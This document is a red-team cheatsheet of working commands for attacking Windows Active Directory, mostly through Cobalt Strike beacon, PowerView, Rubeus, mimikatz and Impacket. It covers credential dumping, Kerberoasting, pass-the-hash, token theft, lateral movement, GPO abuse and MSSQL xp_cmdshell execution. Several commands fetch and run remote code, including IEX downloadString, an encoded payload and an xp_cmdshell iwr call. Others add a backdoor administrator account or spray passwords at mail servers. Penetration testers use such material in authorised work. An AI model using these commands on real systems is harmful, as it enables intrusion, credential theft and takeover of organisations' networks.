# Active Directory Redteam Cheatsheet

## Resources

### General
- [PayloadAlltheThingsAD](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [iRedTeam](https://www.ired.team/)
- [HackTricks](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)
- [LOLBAS](https://lolbas-project.github.io/)
- [Malleable C2 Profile Collection](https://github.com/BC-SECURITY/Malleable-C2-Profiles)

### Guides
- [Custom BloodHound Queries](https://github.com/hausec/Bloodhound-Custom-Queries)
- [Impacket Guide](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)
- [Attacking Domain Trusts (harmj0y)](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [Breaking Forest Trusts (harmj0y)](http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
- [Lateral Movement (specterOps)](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f)
- [Offensive Kerberose (specterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [How Attackers Use Silver Tickets](https://adsecurity.org/?p=2011)
- [Active Directory Exploitation Cheat Sheet (S1ckB0y1337)](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
- [Cobalt Strike Cheat Sheet (S1ckB0y1337)](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet)
- [harmj0y's PowerView Tricks Cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

## Misc Commands

### Base64 Encoding

base64.ps1

```
$input_str = $Args[0]
Write-Host "Input:" $input_str

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($input_str)
$EncodedText =[Convert]::ToBase64String($Bytes)
Write-Host $EncodedText
```

base64.sh

```
#!/bin/bash

echo -n $1 | iconv -f UTF8 -t UTF16LE | base64 -w 0 ; echo
```

Windows save to file

```
[System.IO.File]::WriteAllBytes("C:\Users\<user>\Desktop\da.kirbi", [System.Convert]::FromBase64String("doIFGjCCBRagAwIBBaEDAgEWooIE[...snip...]E6A0Z3QbDUNZQkVSQk9USUMuSU8="))

[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\windows\tasks\golden.kirbi")) | Out-File -Filepath c:\windows\tasks\golden.kirbi.b64
```

### whoami

```
# short
beacon> shell whoami

# full
beacon> shell whoami /all

# groups
beacon> shell whoami /groups

# privileges
beacon> shell whoami /privs
```

### Net

#### Users
```
# local users
beacon> shell net user

# specific local user
beacon> shell net user administrator

# domain users
beacon> shell net user /domain

# specific domain user
beacon> shell net user j.doe /domain
```

#### Groups

```
# local
beacon> shell net localgroup

beacon> shell net localgroup administrators

# domain
beacon> shell net group /domain

beacon> shell net "Domain Admins" /domain
```

#### Computers

```
# domain computers
beacon> shell net group "Domain Computers" /domain

# domain controllers
beacon> shell net group "Domain Controllers" /domain
```

### Other

```
beacon> getuid

beacon> ipconfig /all

beacon> netstat -ano | findstr LIST
```

### BloodHound Queries

```
# find users that can access machine
MATCH (u:User ), (c:Computer {name:"WKSTN-7624.VAULT.IO"}), p=shortestPath((u)-[*1..]->(c)) RETURN p

# find kerberastable users
MATCH (u:User {hasspn:true}) RETURN u

# find kerberoastable users that have path to another computer
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p

# find unconstrained delegation machines
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# shortest path to unconstrained from owned
MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*1..]->(c)) RETURN p

# find domain users with SQLAdmin
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```

### Powershell

```
# check constrained language mode
PS> $ExecutionContext.SessionState.LanguageMode

# easy bypass
Powershell -version 2 [...]

# download
IEX(New-Object Net.WebClient).downloadString('https://[...]')

# download v3+
iex (iwr 'https://[...]')

# no profile
powershell -nop

# execution bypass
powershell -exec bypass

# hidden
powershell -w hidden

# exec base64 command
PS> powershell -enc [...]

# check Applocker
powershell Get-ApplockerPolicy -Effective -xml

# check av
powershell Get-MpComputerStatus

# credentials
PS> $Cred = New-Object System.Management.Automation.PSCredential('vault.io\s.morese', $SecPassword) 
[...]
PS> [...] -Credential $Cred

# list pipes
PS> [System.IO.Directory]::GetFiles("\\.\\pipe\\")
```

### Proxies

```
# access the target network
beacon> socks 1050
[...]

# target network access teamserver
beacon> rportfwd 9001 192.168.1.12 80
[...]

# msf use proxy
msf5> set Proxies socks4:127.0.0.1:1050
```

### Policies

```
PS> Import-Module C:\tools\GPRegistryPolicy\GPRegistryPolicyParser.psm1
PS> Parse-PolFile C:\Users\sysadm\Desktop\Registry.pol
```

## DNS

Enum target domain.

```
# hosted
$ dig vault.io
x.x.x.x
x.x.x.x

# IP info
$ whois x.x.x.x
```

Hunt subdomains.

```
# use dnscan
$ python3 dnscan.py -d vault.io -w subdomains-1000.txt
[*] Processing domain vault.io
[*] Using system resolvers ['192.168.168.2']

[+] Getting nameservers
x.x.x.x - adi.ns.cloudflare.com
x.x.x.x - adi.ns.cloudflare.com
[...]
```

### Resources
- https://github.com/rbsec/dnscan
- https://github.com/tomnomnom/assetfinder

## Phishing

Common options:
- mal attachment
- link to mal doc
- link to MiTM reverse http proxy

Check weak email security.

```
# use spoofcheck
$ ./spoofcheck.py vault.io
[+] vault.io has no SPF record!
[*] No DMARC record found. Looking for organizational record
[+] No organizational DMARC record
[+] Spoofing possible for vault.io!
```

### Resources
- https://github.com/BishopFox/spoofcheck
- https://github.com/kgretzky/evilginx2
- https://github.com/drk1wi/Modlishka

## Password Spraying

Common patterns:
- MonthYear
- SeasonYear
- DayDate

### Address Generation

Address format

```
# collect names into text file
$ cat names.txt
Joe Boden
Larry Mickles
Sarah Black
[...]

$ /opt/namemash/namemash.py employees.txt | sed 's/$/@vault.io/g'
joe.boden@vault.io
jboden@vault.io
boden.joe@vault.io
[...]
```
#### Resources
- https://gist.github.com/superkojiman/11076951

### Spray

```
# Using atomizer
/opt/SprayingToolkit/atomizer.py owa mail.vault.io January2020 emails.txt

# Using MailSniper
PS > ipmo C:\tools\MailSniper\MailSniper.ps1
PS > Invoke-PasswordSprayOWA -ExchHostname mail.vault.io -UserList .\known-emails.txt -Password Spring2021
```

Other useful MailSniper functions
- Get-GlobalAddressList
- Invoke-SelfSearch

Depending on office version, verify valid accounts with `auxiliary/scanner/http/owa_login`

### Resources
- http://weakpasswords.net/
- https://github.com/dafthack/MailSniper
- https://github.com/byt3bl33d3r/SprayingToolkit
- https://gist.github.com/superkojiman/11076951
- https://github.com/digininja/CeWL
- https://github.com/tomnomnom/comb
- https://github.com/ropnop/kerbrute

## Host Recon

### Misc situational awareness.

```
# Using CS
beacon> help net
[...]

beacon> screenshot
[...]

beacon> keylogger 30
[...]

# SeatBelt
beacon> execute-assembly /opt/tools/SeatBelt.exe -group=system
```

### Port scanning

CS

```
# Discovered Targets can view found: 'View -> Targets'
beacon> portscan 10.0.0.0/24 22,80,135,443,445,1433,3389,5895,5896 none
[...]
```

NMAP

```
beacon> socks 1080

# edit /etc/proxychains.conf
$ proxychains3 nmap -n -sT 10.0.0.0/24 -oA nmap-st-10.0.0.0
```

## Persistence 

Common options:
- HKCU / HKLM Registry Autoruns - executed at user login using Run and RunOnce registry keys
- Scheduled Tasks - execute at set intervals
- Startup Folder - execute at user login
- COM hijack - execute with permission to modify entry points

### Resources
- https://github.com/cobbr/SharpSploit
- https://github.com/harleyQu1nn/AggressorScripts
- https://github.com/tyranid/oleviewdotnet
- https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
- https://github.com/Sw4mpf0x/PowerLurk

## Privilege Escalation

### Automated

#### PowerUp.ps1

```
beacon> powershell-import /opt/tools/PowerSploit/Privesc/PowerUp.ps1
beacon> powershell Invoke-AllChecks
```

#### SharpUp.exe

```
beacon> execute-assembly /opt/tools/SharpUp.exe
[...]
```

#### PrivescCheck

```
beacon> powershell-import /opt/tools/PrivescCheck/PrivescCheck.ps1
beacon> powershell Invoke-PrivescCheck
[...]
```

#### SeatBelt

```
beacon> execute-assembly /tools/SeatBelt.exe -group=system
```

### Manual

#### Windows Services

```
beacon> run sc query
[...]

beacon> run sc qc 'Some Service'
[...]

beacon> powershell Get-Service | fl
[...]

beacon> powershell 'Some Service' | Get-ServiceAcl | Select-Object -ExpandProperty Access
[...]

# generate service dll in CS - Attacks > Packages > Windows Executable (Stageless) > Output > Windows Service EXE

# upload
beacon> cd \windows\temp
beacon> upload /root/evil-service.exe

# configure
beacon> shell sc config 'Some Service' binPath= "c:\windows\temp\evil-service.exe"

# start
beacon> run sc start 'Some Service'
[...]

# using peer beacon
beacon> connect localhost 4444
```

#### Unquoted Service Paths

```
# list
beacon> shell wmic service get name, pathname
[...]

# check 
beacon> powershell Get-Acl -Path c:\program files\Super Sql\ | fl
[...]
```

#### Always Elevated

```
# Returns $True if the HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated or the HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated keys are set, $False otherwise. If one of these keys are set, then all .MSI files run with elevated permissions, regardless of current user permissions.

beacon> powershell Get-RegistryAlwaysInstallElevated
[...]

# upload MSI & Execute
beacon> shell msiexec /i c:\Users\target\Desktop\Evil.msi /qn

beacon> connect localhost 4444
```

#### UAC

Technique has been patched from Windows 10 1809 and onwards.

Version 1607 LTSC still vulne (EoL 2026)

```
beacon> help elevate
[...]

# list exploits
beacon> elevate
[...]

# exploit
beacon> elevate uac-token-duplication peer-localhost-6000

# runasadmin
beacon> help runasadmin
beacon> runasadmin
```

### Resources
- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1
- https://github.com/GhostPack/SharpUp
- https://github.com/rasta-mouse/Watson
- https://github.com/itm4n/PrivescCheck
- https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
- https://github.com/hfiref0x/UACME

## Domain Recon

Cobalt Strike

```
# Domain
beacon> net domain

# Domain Controller
beacon> net domain_controllers

# shares
beacon> net shares
beacon> net shares \\vault.io

# Domain User
beacon> net user \\vault.io l.smith

# all users
beacon> net user \\vault.io

# computers
beacon> net computers

# Domain Admins
beacon> net group \\vault.io Domain Admins

# local group
beacon> net localgroup

# logons
beacon> net logons

# sessions
beacon> net sessions \\s-east-05.vault.io

# domain trusts
beacon> net domain_trusts
```

PowerView

```
# Domain
beacon> powershell Get-Domain

# Domain Controller
beacon> powershell Get-DomainController | Select-Object Forest, Name, OSVersion

# Forest
beacon> powershell Get-ForestDomain

# Policy
beacon> powershell Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess

# Domain User for specific user, -Identity l.smith 
beacon> powershell Get-DomainUser -Properties SamAccountName, MemberOf | fl

# All Users
beacon> powershell Get-DomainUser

# computers
beacon> powershell Get-DomainComputer -Properties DnsHostName | Sort-Object -Property DnsHostName

# OU
beacon> powershell Get-DomainOU -Properties Name | Sort-Object -Property Name

# Domain Admins
beacon> powershell Get-DomainGroup -Identity 'Domain Admins' | Select-Object -ExpandProperty Member

# Domain Group Member
beacon> powershell Get-DomainGroupMember -Identity 'Domain Admins' | Select-Object MemberDistinguishedName

# All GPO
beacon> powershell Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

# Specific Computer
beacon> powershell Get-DomainGPO -Properties DisplayName -ComputerIdentity s-east-05| Sort-Object -Property Display

# Specific Policy
beacon> powershell Get-DomainGPO -Identity SomeGPOName

# Download
beacon> download \\vault.io\SysVol\vault.io\Policies\{CBZLLD65-D822-469A-ADB4-BE08DF6FZZZ1\Machine\Registry.pol

# Domain Local Group
beacon> powershell Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName

# Domain User Location
beacon> powershell Find-DomainUserLocation -UserGroupIdentity 'Domain Admins' | Select-Object UserName, SessionFromName

beacon> powershell Find-DomainUserLocation -Domain vault.io -UserIdentity p.sampson

# Local Group
beacon> powershell Get-NetLocalGroup | Select-Object GroupName

# Remote Machine Local Group
beacon> powershell Get-NetLocalGroup -ComputerName 's-east-05'| Select-Object GroupName

# Local Group Member
beacon> powershell Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

# logons
beacon> powershell Get-NetLoggedOn | Select-Object UserName

# sessions
beacon> powershell Get-NetSession -ComputerName s-east-05 | Select-Object CName, UserName

# Domain Trusts
beacon> powershell Get-DomainTrust -Domain vault.io

# non-null SPNs
beacon> powershell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName

# asreproastable
beacon> powershell Get-DomainUser -PreauthNotRequired -Properties SamAccountName

# unconstrained delecation computers
beacon> powershell Get-DomainComputer -Unconstrained -Properties DnsHostName
```

### Resources
- https://github.com/PowerShellMafia/PowerSploit
- https://powersploit.readthedocs.io/en/latest/Recon/
- https://github.com/tevora-threat/SharpView
- https://github.com/HunnicCyber/SharpSniper

## BloodHound

SharpHound

```
beacon> execute-assembly /opt/tools/SharpHound.exe -c All
[...]

beacon> download .\20210210043130_BloodHound.zip
```

bloodhound-python

```
# from linux terminal
$ bloodhound-python -c All -u j.smith -p Passw0rd -d vault.io -dc 10.0.0.1
```

### Resources
- https://github.com/BloodHoundAD/SharpHound3
- https://github.com/fox-it/BloodHound.py
- https://github.com/hausec/Bloodhound-Custom-Queries

## Katz

### LogonPasswords

CS

```
beacon> logonpasswords
[...]
```

SafetyKatz

```
beacon> execute-assembly c:\tools\SafetyKatz.exe
[...]
```

### Security Account Manager

CS

```
beacon> hashdump
[...]

beacon> mimikatz token::elevate lsadump::sam
[...]
```

### Domain Cached Credentials

Mimikatz

```
beacon> mimikatz lsadump::cache

# linux terminal
hashcat -m 2100
```

## Impersonation

### Steal token

```
# find desired PID
beacon> ps

# Steal
beacon> steal_token 4416
[+] Impersonated [...]

# revert
beacon> rev2self
```

### Make Token

```
beacon> make_token vault\boss_adm Passw0rd
[+] Impersonated [...]
```

### Overpass-the-Hash

enum

```
beacon> execute-assembly /opt/tools/Rubeus.exe triage
```

ptt

```
beacon> execute-assembly /opt/tools/Rubeus.exe asktgt /user:b.builder /rc4:8t2g408a8aec852ef2e458b938b8b820 /nowrap /ptt
```

import

```
# get ticket
beacon> execute-assembly /opt/tools/Rubeus.exe asktgt /user:b.builder /rc4:8t2g408a8aec852ef2e458b938b8b820 /nowrap
[...]

# store ticket
PS > [System.IO.File]::WriteAllBytes("C:\Users\adm\Desktop\b.builder-tgt.kirbi", [System.Convert]::FromBase64String("qoIE[...snip...]Mllz"))

# burn session
beacon> make_token vault\b.builder fakepassword
[...]

# import
kerberos_ticket_use C:\Users\adm\Desktop\b.builder-tgt.kirbi
```

### Process Injection

```
# find desired PID
beacon> ps
[...]

beacon> inject 340 x64 peer-localhost
[...]
```

### Resources
- https://github.com/GhostPack/Rubeus
- https://blog.cobaltstrike.com/2014/03/20/user-account-control-what-penetration-testers-should-know/

## Lateral Movement

Common options:
- Windows Management Instrumentation (WMI)
- PowerShell Remoting
- PsExec

### Windows Management Instrumentation (WMI)

Manual

```
beacon> shell wmic /node:"w-west-239" /user:"vault.io\n.perroti" /password:"Passw0rd" process call create "powershell -enc [...snip...]"
```

CS

```
# powershell 1 liner
beacon> remote-exec wmi w-west-239 powershell -enc [...]

# upload
beacon> cd \\w-west-239\c$\windows\temp
beacon> upload /tmp/evil.exe
beacon> cd c:\
beacon> remote-exec wmi w-west-239 c:\windows\temp\evil.exe
beacon> connect w-west-239 4444
```

SharpWMI

```
# skip username/password to run in current context
beacon> execute-assembly /opt/tools/SharpWMI.exe action=exec computername=w-west-239 command="c:\windows\temp\evil.exe" username="vault\n.perroti" password="Passw0rd"
```

Impacket

```
# setup socks in CS
$ proxychains wmiexec.py -hashes 125j41487b0c24188af4e4fed5zcreba:125j41487b0c24188af4e4fed5zcreba b.boss@10.0.0.1
[...]
```

### PowerShell Remoting

CS

```
beacon> jump winrm64 w-west-239 peer-tcp
[...]

beacon> remote-exec winrm w-west-239 whoami; systeminfo
[...]
```

Evil-WinRM

```
# setup proxy via CS
beacon> socks 1050

#edit /etc/proxychains.conf
$ proxychains evil-winrm -i 10.0.0.3 -u administrator -H 125j41487b0c24188af4e4fed5zcreba
```

Invoke-Command

```
Invoke-Command -computername dtop23.vault.io -ScriptBlock {ipconfig /all} [-credential vault.io\b.boss]
```

### PsExec

CS

```
# jump
beacon> jump psexec64 w-west-239 peer-tcp
[...]

# remote exec
beacon> remote-exec psexec w-west-239 cmd.exe /c "net user haxor Passw0rd /add && net localgroup administrators haxor /add"
[...]
```

Impacket

```
# setup socks proxy via CS
$ proxychains psexec.py -hashes '125j41487b0c24188af4e4fed5zcreba:125j41487b0c24188af4e4fed5zcreba' 'vault.io/administrator@10.0.0.3'
```

### DCOM

```
beacon> execute-assembly /opt/tools/CsDCOM.exe -t w-west-239 -b powershell.exe -a "-enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMQAuADEAMAA2ADoAOAAwADAAMAAvAGgAbwBtAGUAJwApACkA" -m mmc20application
[...]

beacon> connect w-west-239 444
[...]
```

### Spawn

```
beacon> spawnas vault\b.boss Passw0rd peer-tcp
[...]

beacon> spawnu <pid> peer-tcp
[...]
```

### Pass the Hash

```
beacon> pth WKSTN-3\Administrator ccbe70d463aef35efd3cdf0d71416b82
```

### Resources
- https://github.com/GhostPack/SharpWMI
- https://github.com/Hackplayers/evil-winrm
- https://github.com/rasta-mouse/MiscTools

## SharpShell

```
beacon> execute-assembly /opt/tools/SharpShell.exe return Shell.PowerShellExecute("whoami");
[...]

beacon> execute-assembly /opt/tools/SharpShell.exe var av = SCM.GetService("w-west-239","WinDefend"); return av.Status.ToString();
```

### Resources
- https://github.com/dwmkerr/sharpshell

## Foreign Listeners

CS -> MSF

```
# setup msf handler & create new CS listener to point to msf handler
beacon> spawn msf-listener
[...]
```

MSF -> CS

```
# In CS, Attacks -> Packages -> Payload Generator -> Raw
msf5> use post/windows/manage/shellcode_inject
msf5> set session 1
msf5> set shellcode /root/payload.bin
msf5> run
```

## Credential Manager

Local Admin

```
beacon> mimikatz sekurlsa::dpapi
[...]
```

Standard User

```
# list creds
beacon> shell vaultcmd /listcreds:"Windows Credentials" /all
[...]

# list files
beacon> ls c:\users\<user>\AppData\Local\Microsoft\Credentials

# Get blob, note guidMasterKey and pbData
beacon> mimikatz dpapi::cred /in:c:\users\<user>\AppData\Local\Microsoft\Credentials\<credential>
[...]

# get user sid
beacon> powershell-import /opt/tools/PowerSploit/Recon/PowerView.ps1
beacon> powershell ConvertTo-SID -ObjectName 'h.samuelson' -Domain 'vault.io'
S-1-5-21[...]

# get MasterKey
beacon> c:\users\h.samuelson\appdata\Roaming\Microsoft\Protect\<sid>\
[...]

beacon> mimikatz dpapi::masterkey /in:c:\users\h.samuelson\appdata\Roaming\Microsoft\Protect\<sid>\<guid> /rpc
[domainkey] with RPC
[DC] 'vault.io' will be the domain
[DC] 'dc01.vault.io' will be the DC server
  key : [...]

# decrypt
beacon> mimikatz dpapi::cred /in:c:\users\h.samuelson\AppData\Local\Microsoft\Credentials\<credential> /masterkey:<masterkey>
[...]
UserName: vault\server_admin
CredentialBlog: l33tPw4vault
```

Chrome

```
# cs
beacon> chromedump

# SharpChrome
beacon> execute-assembly /opt/tools/SharpChrome.exe history logins
```

### Resources
- https://github.com/djhohnstein/SharpChrome

## Kerberos

### Kerberoasting

Hunt with PowerView

```
beacon> powershell-import /opt/tools/PowerSploit/Recon/PowerView.ps1
beacon> powershell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
[...]
```

Kerberoast using Rubeus

```
beacon> execute-assembly /opt/tools/Rubeus.exe kerberoast
[...]
```

impacket

```
# setup socks proxy
beacon> socks 1050
[...]

# from linux terminal 
$ proxychains /usr/local/bin/GetUserSPNs.py -target-domain vault -usersfile kerberoast_able-users.txt -request -dc-ip 10.0.0.1 'vault/s.user:Passw0rd'

# crack
$ hashcat -a 0 -m 18200 [...]
```

### ASREPRoasting

Hunt with PowerView

```
beacon> Get-DomainUser -PreauthNotRequired -Properties SamAccountName
```

Impacket

```
proxychains GetNPUsers.py vault.io/ -usersfile users.txt -dc-ip 10.0.0.1
```

Kerbrute

```
$ kerbrute userenum --dc 10.0.0.1 -d vault.io users.txt
```

Rubeus

```
beacon> execute-assembly /opt/tools/Rubues.exe asreproast /format:hashcat
[...]
```

Crack

```
$ hashcat -a 0 -m 13100
```

### Unconstrained Delegation

Find computers assigned unconstrained delegation

```
# CS
beacon> powershell-import /opt/tools/PowerSploit/PowerView.ps1
beacon> Get-DomainComputer -Unconstrained -Properties DnsHostName
[...]

# BloodHound
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# shortest path to unconstrained from owned
MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

From the unconstrained machine

```
# Rubeus list tickets
beacon> execute-assembly /opt/tools/Rubeus.exe triage

# Rubeus dump all
beacon> execute-assembly /opt/tools/Rubeus.exe dump /nowrap

# Rubeus dump specific
beacon> execute-assembly /opt/tools/Rubeus.exe dump /luid:/0x[...] /nowrap

# new process, not pid and luid
beacon> execute-assembly /opt/tools/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
[...]

# ptt
beacon> execute-assembly /opt/tools/Rubeus.exe ptt /luid:0x[...] /ticket:[...]

# Impersonate
beacon> steal_token <pid>
```

### Printer Bug

```
# monitor
beacon> execute-assembly /opt/tools/Rubeus.exe monitor /internal:10 /nowrap

# exploit
beacon> execute-assembly /opt/tools/SpoolSample.exe dc01.vault.io www03.vault.io
[...]

# Rubeus announces new TGT
Found new TGT:
[...]

# Save to disk
PS > [System.IO.File]::WriteAllBytes("C:\Users\sysadm\Desktop\dc01.kirbi", [System.Convert]::FromBase64String("dceIFGjCCBRagAwIBBaEDAgEWooIE[...snip...]rt0Z3QbDUNZQkVSQk9USUMuSv8="))

# import
beacon> kerberos_ticket_use c:\users\sysadm\desktop\dc01.kirbi
```

### Resources
- https://github.com/ropnop/kerbrute

### Constrained Delegation

```
# recon
beacon> powerpick Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
[...]

# krbtgt ticket
beacon> execute-assembly /tools/Rubeus.exe dump /service:krbtgt /nowrap
[...]

# impersonate - /altservice option for request of tickets for any service being run by target computer
beacon> execute-assembly /tools/Rubeus.exe s4u /impersonateuser:n.marco /msdsspn:cifs/fs03.vault.io /ticket:doI[...]5JTw== /nowrap
[...]

# check it
beacon> execute-assembly /tools/Rubeus.exe describe /ticket:[...]

# sacraficial process - note luid and process id
beacon> execute-assembly /tools/Rubeus.exe createnetonly /program:c:\windows\system32\cmd.exe
[...]

# impoprt
beacon> execute-assembly /tools/Rubeus.exe ptt /luid:0x3a11332 /ticket:doIGW[...]

# steal
beacon> steal_token 440
[...]
```

### Resources
- https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
- https://phackt.com/en-kerberos-constrained-delegation-with-protocol-transition
- https://exploit.ph/revisiting-delegate-2-thyself.html

### Credential Cache

```
# obtain
$ proxychains scp -r root@10.0.0.23:/tmp/krb5cc_613516103_maDBOTO
[...]

# convert
$ ticketConverter.py /tmp/krb5cc_613516103_maDBOTO /tmp/stolenticket.kirbi
[...]

# impersonate
beacon> kerberos_ticket_use /tmp/stolenticket.kirbi
```

## GPO

Enumerate SIDs that can create new GPOs

```
# get SID
beacon> powershell-import /tools/PowerSploit/Recon/PowerView.ps1
beacon> powerpick Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=vault,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# convert SID
beacon> powerpick ConvertFrom-SID S-1-5-21-2765823697-1816233505-1834004910-1706
[...]
```

Enumerate principals that can write to GP-Link

```
beacon> powershell-import /tools/PowerSploit/Recon/PowerView.ps1
beacon> powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl

# find computers
beacon> powerpick Get-DomainComputer | ? { $_.DistinguishedName -match "OU=1868" -or $_.DistinguishedName -match "OU=5415" } | select DnsHostName
```

Create new GPO

```
# new
beacon> powershell New-GPO -Name 'Likesss' | New-GPLink -Target 'OU=1668,OU=Workstations,DC=vault,DC=io'
[...]

# configure
beacon> execute-assembly /tools/SharpGPOAbuse.exe --AddComputerTask --TaskName "Likesss" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c powershell -nop -w hidden -enc SQBF[...]ACkA" --GPOName "Likesss"
```

### Resources
- https://github.com/FSecureLABS/SharpGPOAbuse

## MSSQL

### Enumerate

BloodHound

```
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```

PowerUpSQL

```
# auth
beacon> make_token vault.io\mssql_svc Passw0rd

# import
beacon> powershell-import /tools/PowerUpSQL/PowerUpSQL.ps1

# find
beacon> powershell Get-SQLInstanceDomain

# check access
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest

# get details
beacon> powershell Get-SQLServerInfo -Instance 'sql01.vault.io,1433'

# query
beacon> powershell Get-SQLQuery -Instance 'sql01.vault.io,1433' -Query 'select @@servername'

# execute system command
beacon> powerpick Invoke-SQLOSCmd -Instance 'sql-1.vault.io,1433' -Command 'dir C:\' -RawResults

# access via client
beacon> socks 1050
$ proxychains socat TCP4-Listen:1433,fork TCP:10.0.0.20:1433
cmd.exe> runas /netonly /user:VAULT\mssql_svc "C:\Program Files\HeidiSQL\heidisql.exe"
```

### Client

Using Heidi

```
# test
SELECT @@version

# check
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'

# enable
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE

# exec
EXEC xp_cmdshell 'whoami'

```

### Links

CS

```
beacon> powershell Get-SQLServerLinkCrawl -Instance 'sql-1.vault.io,1433'
[...]

beacon> powershell Get-SQLServerLinkCrawl -Instance 'sql-1.vault.io,1433' -Query 'select @@version' | select Instance, CustomQuery | % { $_ | Add-Member NoteProperty 'QueryResult' $($_.CustomQuery[0]); $_ } | fl
```

Client (Hiedi)

```
# show links
SELECT * FROM master..sysservers

# execute queries on link
SELECT * FROM OPENQUERY("sql02.vault.external", 'select @@servername')

# Enable xp_cmdshell 
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql02.vault.io]

EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql02.vault.io]

SELECT * FROM OPENQUERY("sql02.vault.io", 'select * from sys.configurations where name = ''xp_cmdshell''')

# Enable xp_cmdshell **via** openquery
SELECT 1 FROM openquery("dc01", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')

# This can also be nested (potentially coming back to the own server with different permissions)
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT SERVER1') AT SERVER2
EXEC ('EXEC (''xp_cmdshell ''''powershell.exe -exec bypass -c "iex(iwr http://<ip>/run.txt -usebasicparsing)"'''';'') AT SERVER1') AT SERVER2

SELECT 1 FROM openquery("dc01", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')

# scripted web delivery
SELECT * FROM OPENQUERY("sql02.vault.io", 'select @@servername; exec xp_cmdshell ''powershell -enc [...snip...]''')

# get command output
# run Get-MpThreatDetection | Out-File -FilePath C:\Windows\Temp\out.txt and get output
SELECT * FROM OPENQUERY("sql02.vault.io", 'select * from openquery("sql01.vault.io", ''select * from openrowset(bulk N''''C:\Windows\Temp\defenderlog.txt'''', single_nclob) as contents'')')
```

### Privilege Escalation

```
beacon> shell whoami /all
[...]
SeImpersonate Enabled

beacon> shell PrintSpoofer.exe -c "powershell -enc [...]"
[...]
```

### Resources
- [Attacking SQL Server CLR Assemblies](https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/)
- [Hacking SQL Server Stored Procedures – Part 1: (un)Trustworthy Databases](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
- [Hacking SQL Server Stored Procedures – Part 2: User Impersonation](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
- [Hacking SQL Server Stored Procedures – Part 3: SQL Injection](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/)
- [Lateral movement through Microsoft SQL Server links](https://hackmag.com/security/lateral-movement/)
- [The dangers of MSSQL features – Impersonation & Links](https://improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links)
- [Using SQL Server for attacking a Forest Trust](http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html)
- [How to Hack Database Links in SQL Server!](https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/)
- [Database Links Cheat Sheet](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/Security_cheatsheets/databases/sqlserver/5-lateral-movement.md)
- [MSSQL - OSEP Code Snippets](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs)
